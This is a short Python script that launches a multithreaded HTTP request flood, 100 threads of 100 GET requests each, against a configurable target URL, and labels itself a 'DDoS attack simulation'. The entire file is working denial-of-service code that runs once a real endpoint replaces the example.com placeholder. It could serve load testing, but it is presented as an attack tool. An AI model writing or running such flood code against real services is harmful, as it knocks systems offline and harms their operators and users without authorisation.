import threading
import requests
import time

# Configuration
TARGET_URL = "http://example.com/api"  # Replace with the target API endpoint
THREAD_COUNT = 100  # Number of concurrent threads
REQUESTS_PER_THREAD = 100  # Number of requests per thread
TIMEOUT = 5  # Timeout for each request in seconds

def send_requests(thread_id):
    """Function to send a burst of requests."""
    print(f"Thread-{thread_id} starting...")
    for i in range(REQUESTS_PER_THREAD):
        try:
            response = requests.get(TARGET_URL, timeout=TIMEOUT)
            print(f"Thread-{thread_id} Request-{i+1}: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Thread-{thread_id} Request-{i+1} failed: {e}")
    print(f"Thread-{thread_id} completed.")

def main():
    """Main function to orchestrate the simulated attack."""
    print("Initializing DDoS attack simulation...")
    print(f"Target URL: {TARGET_URL}")
    print(f"Thread Count: {THREAD_COUNT}")
    print(f"Requests per Thread: {REQUESTS_PER_THREAD}")
    
    threads = []

    # Create and start threads
    for i in range(THREAD_COUNT):
        thread = threading.Thread(target=send_requests, args=(i,))
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    print("DDoS attack simulation complete.")

if __name__ == "__main__":
    start_time = time.time()
    main()
    end_time = time.time()
    print(f"Total execution time: {end_time - start_time:.2f} seconds")
